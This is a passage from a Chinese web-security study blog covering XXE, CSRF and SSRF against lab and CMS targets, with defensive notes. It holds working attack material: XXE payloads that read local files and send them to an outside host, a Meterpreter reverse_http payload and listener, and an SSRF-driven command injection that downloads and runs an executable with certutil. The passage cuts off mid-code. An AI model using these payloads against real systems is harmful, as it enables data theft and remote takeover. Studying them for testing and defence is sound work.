class="string">&quot;http://47.94.236.117/test.dtd&quot;</span>&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">test.dtd</span><br><span class="line"><span class="comment">// 远程dtd再获得参数</span></span><br><span class="line">&lt;!ENTITY % all <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://47.94.236.117/get.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、其他玩法（协议）-见参考地址</span><br></pre></td></tr></table></figure><h2 id="XML-amp-XXE-前端-CTF-amp-Jarvisoj-amp-探针-amp-利用"><a href="#XML-amp-XXE-前端-CTF-amp-Jarvisoj-amp-探针-amp-利用" class="headerlink" title="XML&amp;XXE-前端-CTF&amp;Jarvisoj&amp;探针&amp;利用"></a>XML&amp;XXE-前端-CTF&amp;Jarvisoj&amp;探针&amp;利用</h2><p><a href="http://web.jarvisoj.com:9882/">点我去靶场</a></p><p>XXE黑盒发现：</p><ul><li>获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试</li><li>不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe</li></ul><p>流程：功能分析-前端提交-源码&amp;抓包-构造Paylod测试</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">更改请求数据格式：Content-Type: application/xml</span><br><span class="line">更改包内容</span><br><span class="line"><span class="meta">&lt;?</span>xml version = <span class="string">&quot;1.0&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY f SYSTEM <span class="string">&quot;file:///home/ctf/flag.txt&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure><h2 id="XML-amp-XXE-白盒-CMS-amp-PHPSHE-amp-无回显审计"><a href="#XML-amp-XXE-白盒-CMS-amp-PHPSHE-amp-无回显审计" class="headerlink" title="XML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显审计"></a>XML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显审计</h2><p>审计流程：</p><ul><li>漏洞函数simplexml_load_string</li><li>pe_getxml函数调用了漏洞函数</li><li>wechat_getxml调用了pe_getxml</li><li>notify_url调用了wechat_getxml</li></ul><p>访问notify_url文件触发wechat_getxml函数,构造Paylod测试</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">先尝试读取文件，无回显后带外测试：</span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> <span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM <span class="string">&quot;http://1uwlwv.dnslog.cn&quot;</span>&gt;</span><br><span class="line">    %file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;</span><br><span class="line">然后带外传递数据解决无回显：</span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;file:///d:/e.txt&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM <span class="string">&quot;http://47.94.236.117/test.dtd&quot;</span>&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">test.dtd：</span><br><span class="line">&lt;!ENTITY % all <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://47.94.236.117/get.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0029-WEB攻防-20-通用漏洞(逻辑漏洞)之CSRF&amp;SSRF&amp;协议玩法&amp;内网探针&amp;漏洞利用</title>
      <link href="/2023/07/01/SEC-Study-0057/"/>
      <url>/2023/07/01/SEC-Study-0057/</url>
      
        <content type="html"><![CDATA[<h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1、CSRF- 原理&amp;危害&amp;探针&amp;利用等<br>2、SSRF- 原理&amp;危害&amp;探针&amp;利用等<br>3、CSRF&amp;SSRF- 黑盒下漏洞探针点</p><h2 id="详细点–认知"><a href="#详细点–认知" class="headerlink" title="详细点–认知"></a>详细点–认知</h2><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p><img src="i1.png" alt="CSRF"></p><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>CSRF全称：Cross- site request forgery，即，跨站请求伪造，也被称为 “One Click Attack” 或 “Session Riding”，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。</p><blockquote><p>举个生活中的例子：就是某个人点了个奇怪的链接，自己什么也没输，但自己的qq号或其他的号就被盗了。即该攻击可以在 <strong>受害者不知情</strong> 的情况下 <strong>以受害者名义伪造请求</strong> ， <strong>执行恶意操作</strong> ，具有很大的危害性。</p></blockquote><h4 id="CSRF的攻击前准备："><a href="#CSRF的攻击前准备：" class="headerlink" title="CSRF的攻击前准备："></a>CSRF的攻击前准备：</h4><ul><li>知道对方是谁（具体到哪个管理员）</li><li>对数据包构造进行复现（复现出添加管理员的数据包，使用OWASP-CSRFTester模拟导出数据包）</li><li>对方是否会访问这个地址（一访问即触发）</li></ul><h4 id="CSRF的攻击过程两个条件："><a href="#CSRF的攻击过程两个条件：" class="headerlink" title="CSRF的攻击过程两个条件："></a>CSRF的攻击过程两个条件：</h4><ul><li>目标用户已经登录了网站，能够执行网站的功能。(准备好操作的权限)</li><li>目标用户访问了攻击者构造的URL。(攻击者伪造数据包放在网址下，例如添加管理员账密的数据包，访问即添加)</li></ul><h4 id="CSRF安全问题黑盒怎么判断："><a href="#CSRF安全问题黑盒怎么判断：" class="headerlink" title="CSRF安全问题黑盒怎么判断："></a>CSRF安全问题黑盒怎么判断：</h4><ul><li>看验证来源(同源策略) - 修复<ul><li>点击跳转时，数据包的 <strong>Referer字段</strong> 带着你从哪个网页来的信息</li><li>同源策略：非本站的数据包（直接指定是不是来源于本站数据包）判定为非法来源，不过不安全，来源数据包可以被BP修改</li><li>鉴定同源策略的方法：<ul><li>在指定页面点击某个a链接访问网址，假设这个访问跳转到<a href="http://xxx.com,并且能正常访问/">http://xxx.com,并且能正常访问</a></li><li>那么在别的地方，没有点击指定的a链接地址，直接访问<a href="http://xxx.com/">http://xxx.com</a></li><li>如果两种方式访问的结果一样，则证明没有同源策略检测</li><li>如果提示非法来源，则表示有这个策略</li></ul></li></ul></li><li>看凭据有无token - 修复<ul><li>token是每个操作的标识，每一个操作token会立刻更改</li><li>有无token的区别：数据包</li><li>关键点：带token后即使构造数据包也没有用</li></ul></li><li>看关键操作有无验证 - 修复<ul><li>验证同源策略</li></ul></li></ul><h4 id="CSRF安全问题白盒怎么审计："><a href="#CSRF安全问题白盒怎么审计：" class="headerlink" title="CSRF安全问题白盒怎么审计："></a>CSRF安全问题白盒怎么审计：</h4><ul><li>同黑盒思路一样，代码中分析上述三看</li></ul><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>如果对方存在接收值，并且把值进行资源访问，那么就可能存在SSRF。<br><img src="i2.png" alt="SSRF"></p><h4 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h4><p>SSRF(Server- Side Request Forgery):</p><ul><li>服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</li><li>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</li><li>（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</li><li>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</li><li>总结：命令发到服务端，服务端再将命令进行服务端本地发送执行</li></ul><p>比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><blockquote><p>图片上传分为两种<br>1.本地上传（用户上传到服务器）<br>2.远程加载上传（服务器加载远程图片时也是一种上传）<br>远程加载的过程：<br>1.访问图片地址（服务器访问远程地址）<br>2.下载图片到服务器<br>如果拿下cmd，使用cmd下载命令将后门插入对方服务器，上线木马</p></blockquote><ul><li>SSRF黑盒可能出现的地方：<ul><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li><li>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</li></ul></li></ul><p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……<br>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p><h4 id="SSRF白盒可能出现的地方："><a href="#SSRF白盒可能出现的地方：" class="headerlink" title="SSRF白盒可能出现的地方："></a>SSRF白盒可能出现的地方：</h4><ul><li>功能点抓包指向代码块审计</li><li>功能点函数定位代码块审计</li></ul><h4 id="SSRF常见安全修复防御方案："><a href="#SSRF常见安全修复防御方案：" class="headerlink" title="SSRF常见安全修复防御方案："></a>SSRF常见安全修复防御方案：</h4><ul><li>禁用跳转</li><li>禁用不需要的协议</li><li>固定或限制资源地址</li><li>错误信息统一信息处理</li></ul><h2 id="系列内容点："><a href="#系列内容点：" class="headerlink" title="系列内容点："></a>系列内容点：</h2><ul><li>CSRF&amp;SSRF&amp;原理&amp;利用&amp;协议等</li><li>CSRF&amp;SSRF&amp;黑盒&amp;审计&amp;修复等</li></ul><h1 id="黑盒-功能点"><a href="#黑盒-功能点" class="headerlink" title="黑盒(功能点)"></a>黑盒(功能点)</h1><h2 id="CSRF-原理-amp-后台自动添加管理员"><a href="#CSRF-原理-amp-后台自动添加管理员" class="headerlink" title="CSRF- 原理&amp;后台自动添加管理员"></a>CSRF- 原理&amp;后台自动添加管理员</h2><ul><li>案例说明：小迪在登录后台管理自己网站的时候，突然群里给小迪说阿祖又说爱上别人了，随后给我发了个URL链接，小迪直接点了进去，GG！</li></ul><p>小迪的网站：<a href="http://test.xiaodi8.com/">http://test.xiaodi8.com/</a><br>发送的URL：<a href="http://47.94.236.117/add.html">http://47.94.236.117/add.html</a><br>利用流程：<br>1、获取目标的触发数据包<br>2、利用CSRFTester构造导出<br>3、诱使受害者访问特定地址触发</p><h2 id="SSRF-原理-amp-服务-amp-协议-amp-内网-amp-漏洞"><a href="#SSRF-原理-amp-服务-amp-协议-amp-内网-amp-漏洞" class="headerlink" title="SSRF- 原理&amp;服务&amp;协议&amp;内网&amp;漏洞"></a>SSRF- 原理&amp;服务&amp;协议&amp;内网&amp;漏洞</h2><ul><li>参考文章：<a href="https://www.t00ls.cc/articles-">https://www.t00ls.cc/articles-</a> 41070.html</li><li>案例说明：小迪在本地创建了远程图片文件加载应用，直接被攻击者利用SSRF探针本地及内网服务，并利用某漏洞直接获取到内网某主机的权限！</li></ul><p>1、服务探针：访问特殊的服务器内本地的端口，看对应功能是不是开放的（报错、卡顿都表示存在）</p><p><a href="http://127.0.0.1:8081/">http://127.0.0.1:8081/</a><br><a href="http://127.0.0.1:3306/">http://127.0.0.1:3306/</a></p><p>2、协议玩法：（更多玩法见上图）</p><p>file:///D:/<a href="http://www.txt/">www.txt</a> =&gt; 收集敏感文件是否存在<br>dict://127.0.0.1 :3306/info<br><a href="ftp://192.168.46.148/">ftp://192.168.46.148:21</a></p><p>3、内网扫描：</p><p>请求卡顿时，这个测点八成是存在的<br><a href="http://192.168.46.148:8080/">http://192.168.46.148:8080</a></p><p>4、漏洞利用：</p><ul><li><p>生成：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">msfvenom - p windows/meterpreter/reverse_http LHOST=<span class="number">47.94</span>.<span class="number">236.117</span> LPORT=<span class="number">6688</span> - f exe - o xx.exe</span><br></pre></td></tr></table></figure></li><li><p>监听：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">multi</span>/<span class="title">handler</span></span><br><span class="line"><span class="title">set</span> <span class="title">payload</span> <span class="title">windows</span>/<span class="title">meterpreter</span>/<span class="title">reverse_http</span></span><br><span class="line"><span class="title">set</span> <span class="title">lhost</span> 0.0.0.0</span><br><span class="line"><span class="title">set</span> <span class="title">lport</span> 6688</span><br><span class="line"><span class="title">run</span></span><br></pre></td></tr></table></figure></li><li><p>下载：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//192.168.46.148:8080/?search==%00&#123;.exec|cmd.exe%20/c%20certutil%20- urlcache%20- split%20- f%20http://47.94.236.117/xx.exe.&#125; </span></span><br></pre></td></tr></table></figure></li><li><p>执行：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//192.168.46.148:8080/?search==%00&#123;.exec|xx.exe.&#125;</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="i3.png" alt="SSRF"><br><img src="i4.png" alt="协议"></p><h2 id="SSRF-某实际案例测试演示-功能点"><a href="#SSRF-某实际案例测试演示-功能点" class="headerlink" title="SSRF- 某实际案例测试演示(功能点)"></a>SSRF- 某实际案例测试演示(功能点)</h2><p>基于上述的SSRF的漏洞原理，漏洞探针开展黑盒思路分析那些可能存在<br>能利用则高危，不能利用则变成信息收集。</p><h1 id="白盒-代码层面"><a href="#白盒-代码层面" class="headerlink" title="白盒(代码层面)"></a>白盒(代码层面)</h1><h2 id="CSRF-1"><a href="#CSRF-1" class="headerlink" title="CSRF"></a>CSRF</h2><blockquote><p>工具<br>CSRFTester：</p><blockquote><p>必须使用8008端口，这样子才能抓取表单数据包<br>最终会抓取Get或者Post数据包，抓取的数据包可以导出，修改后放在服务器上，等待管理员登录时访问该数据包，就能添加新管理员。<br>如果有验证，就不能使用此方法。</p></blockquote></blockquote><p>复现：直接复现<br>成功-&gt;有漏洞<br>没有-&gt;代码-&gt;缺陷过滤（绕过）-&gt;有漏洞<br>失败-&gt;代码-&gt;完整过滤-&gt;没有</p><p>其他漏洞：<br>关键函数和应用功能</p><h3 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h3><p>SCMSFH源码当中的admin.php，里面的编辑函数，用于添加管理员<br>拦截添加管理员的数据包，并且修改数据包的数据，添加自己想要的管理员<br>在真管理员登录时，诱导真管理员点击自己预先准备好的链接，等待他点击时就能添加管理员了<br>因为没有验证，可以直接添加管理员</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&quot;edit&quot;</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$A4_0x</span>==<span class="number">0</span> &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&quot;A_id&quot;</span>]!=<span class="variable">$A_id</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&#123;\&quot;msg\&quot;:\&quot;请勿编辑其他管理员！\&quot;&#125;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$A_head</span>=<span class="variable">$_POST</span>[<span class="string">&quot;A_head&quot;</span>];</span><br><span class="line">  <span class="variable">$A_login</span>=<span class="variable">$_POST</span>[<span class="string">&quot;A_login&quot;</span>];</span><br><span class="line">  <span class="variable">$A_pwd</span>=<span class="variable">$_POST</span>[<span class="string">&quot;A_pwd&quot;</span>];</span><br><span class="line">  <span class="variable">$A0_0</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A0_0&quot;</span>]);</span><br><span class="line">  <span class="variable">$A1_0</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A1_0&quot;</span>]);</span><br><span class="line">  <span class="variable">$A1_1</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A1_1&quot;</span>]);</span><br><span class="line">  <span class="variable">$A1_2</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A1_2&quot;</span>]);</span><br><span class="line">  <span class="variable">$A1_3</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A1_3&quot;</span>]);</span><br><span class="line">  <span class="variable">$A1_4</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A1_4&quot;</span>]);</span><br><span class="line">  <span class="variable">$A1_5</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A1_5&quot;</span>]);</span><br><span class="line">  <span class="variable">$A2_0</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A2_0&quot;</span>]);</span><br><span class="line">  <span class="variable">$A2_1</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A2_1&quot;</span>]);</span><br><span class="line">  <span class="variable">$A2_2</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A2_2&quot;</span>]);</span><br><span class="line">  <span class="variable">$A2_3</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A2_3&quot;</span>]);</span><br><span class="line">  <span class="variable">$A3_0</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A3_0&quot;</span>]);</span><br><span class="line">  <span class="variable">$A3_1</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A3_1&quot;</span>]);</span><br><span class="line">  <span class="variable">$A3_2</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A3_2&quot;</span>]);</span><br><span class="line">  <span class="variable">$A3_3</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A3_3&quot;</span>]);</span><br><span class="line">  <span class="variable">$A3_4</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A3_4&quot;</span>]);</span><br><span class="line">  <span class="variable">$A4_0</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A4_0&quot;</span>]);</span><br><span class="line">  <span class="variable">$A4_1</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A4_1&quot;</span>]);</span><br><span class="line">  <span class="variable">$A4_2</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A4_2&quot;</span>]);</span><br><span class="line">  <span class="variable">$A5_0</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A5_0&quot;</span>]);</span><br><span class="line">  <span class="variable">$A5_1</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A5_1&quot;</span>]);</span><br><span class="line">  <span class="variable">$A5_2</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A5_2&quot;</span>]);</span><br><span class="line">  <span class="variable">$A5_3</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A5_3&quot;</span>]);</span><br><span class="line">  <span class="variable">$A6_0</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;A6_0&quot;</span>]);</span><br><span class="line">  <span class="variable">$A_part</span>=<span class="string">&quot;A0_0:<span class="subst">$A0_0</span>,A1_0:<span class="subst">$A1_0</span>,A1_1:<span class="subst">$A1_1</span>,A1_2:<span class="subst">$A1_2</span>,A1_3:<span class="subst">$A1_3</span>,A1_4:<span class="subst">$A1_4</span>,A1_5:<span class="subst">$A1_5</span>,A2_0:<span class="subst">$A2_0</span>,A2_1:<span class="subst">$A2_1</span>,A2_2:<span class="subst">$A2_2</span>,A2_3:<span class="subst">$A2_3</span>,A3_0:<span class="subst">$A3_0</span>,A3_1:<span class="subst">$A3_1</span>,A3_2:<span class="subst">$A3_2</span>,A3_3:<span class="subst">$A3_3</span>,A3_4:<span class="subst">$A3_4</span>,A4_0:<span class="subst">$A4_0</span>,A4_1:<span class="subst">$A4_1</span>,A4_2:<span class="subst">$A4_2</span>,A5_0:<span class="subst">$A5_0</span>,A5_1:<span class="subst">$A5_1</span>,A5_2:<span class="subst">$A5_2</span>,A5_3:<span class="subst">$A5_3</span>,A6_0:<span class="subst">$A6_0</span>,&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$A_login</span>!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;|\(|\*|--|#| |\&#x27;|&quot;|\.\//i&#x27;</span>, <span class="variable">$A_login</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;&#123;\&quot;msg\&quot;:\&quot;用户名含有特殊字符，请重新输入\&quot;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$A4_0x</span>==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$A_pwd</span>!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="string">&quot;update sl_admin set</span></span><br><span class="line"><span class="string">        A_head=&#x27;<span class="subst">$A_head</span>&#x27;,</span></span><br><span class="line"><span class="string">        A_login=&#x27;<span class="subst">$A_login</span>&#x27;,</span></span><br><span class="line"><span class="string">        A_part=&#x27;<span class="subst">$A_part</span>&#x27;,</span></span><br><span class="line"><span class="string">        A_pwd=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$A_pwd</span>).<span class="string">&quot;&#x27;</span></span><br><span class="line"><span class="string">        where A_id=&quot;</span>.<span class="variable">$A_id</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="string">&quot;update sl_admin set</span></span><br><span class="line"><span class="string">        A_head=&#x27;<span class="subst">$A_head</span>&#x27;,</span></span><br><span class="line"><span class="string">        A_login=&#x27;<span class="subst">$A_login</span>&#x27;,</span></span><br><span class="line"><span class="string">        A_part=&#x27;<span class="subst">$A_part</span>&#x27;</span></span><br><span class="line"><span class="string">        where A_id=&quot;</span>.<span class="variable">$A_id</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$A_pwd</span>!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="string">&quot;update sl_admin set A_head=&#x27;<span class="subst">$A_head</span>&#x27;,A_pwd=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$A_pwd</span>).<span class="string">&quot;&#x27; where A_id=&quot;</span>.<span class="variable">$A_id</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="string">&quot;update sl_admin set A_head=&#x27;<span class="subst">$A_head</span>&#x27; where A_id=&quot;</span>.<span class="variable">$A_id</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="string">&quot;insert into sl_log(L_aid,L_time,L_add,L_ip,L_title) values(&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&quot;A_id&quot;</span>].<span class="string">&quot;,&#x27;&quot;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>).<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&quot;add&quot;</span>].<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="title function_ invoke__">getip</span>().<span class="string">&quot;&#x27;,&#x27;编辑管理员&#x27;)&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&#123;\&quot;msg\&quot;:\&quot;success\&quot;,\&quot;id\&quot;:\&quot;&quot;</span>.<span class="variable">$A_id</span>.<span class="string">&quot;\&quot;&#125;&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&#123;\&quot;msg\&quot;:\&quot;请填全信息\&quot;&#125;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="有验证"><a href="#有验证" class="headerlink" title="有验证"></a>有验证</h3><p>zblog cms，添加用户时出现来源验证，但没有验证token来源</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">地址：http:<span class="comment">//127.0.0.1:8033/zb_system/cmd.php?act=MemberPst&amp;csrfToken=1930e15cdc4bda27f3fafc8d7915f214</span></span><br><span class="line">分析：cmd.php =&gt; act=MemberPst  csrfToken=<span class="number">1930e15</span>cdc4bda27f3fafc8d7915f214</span><br><span class="line"></span><br><span class="line">cmd.php</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;MemberPst&#x27;</span>:</span><br><span class="line">    <span class="title function_ invoke__">CheckIsRefererValid</span>();  =&gt; 告诉网页自己的来源(单词语义)</span><br><span class="line">    <span class="title function_ invoke__">PostMember</span>();           =&gt; </span><br><span class="line">    <span class="variable">$zbp</span>-&gt;<span class="title function_ invoke__">BuildModule</span>();</span><br><span class="line">    <span class="variable">$zbp</span>-&gt;<span class="title function_ invoke__">SaveCache</span>();</span><br><span class="line">    <span class="variable">$zbp</span>-&gt;<span class="title function_ invoke__">SetHint</span>(<span class="string">&#x27;good&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Redirect</span>(<span class="string">&#x27;cmd.php?act=MemberMng&#x27;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CheckIsRefererValid</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$zbp</span>;</span><br><span class="line">    <span class="variable">$flag</span> = <span class="title function_ invoke__">CheckCSRFTokenValid</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$flag</span> &amp;&amp; <span class="variable">$zbp</span>-&gt;option[<span class="string">&#x27;ZC_ADDITIONAL_SECURITY&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="title function_ invoke__">CheckHTTPRefererValid</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$flag</span>) &#123;</span><br><span class="line">        <span class="variable">$zbp</span>-&gt;<span class="title function_ invoke__">ShowError</span>(<span class="number">5</span>, <span class="keyword">__FILE__</span>, <span class="keyword">__LINE__</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CheckHTTPRefererValid</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$bloghost</span>;</span><br><span class="line">    <span class="variable">$referer</span> = <span class="title function_ invoke__">GetVars</span>(<span class="string">&#x27;HTTP_REFERER&#x27;</span>, <span class="string">&#x27;SERVER&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">trim</span>(<span class="variable">$referer</span>) === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$bloghost</span>;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:80/&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span 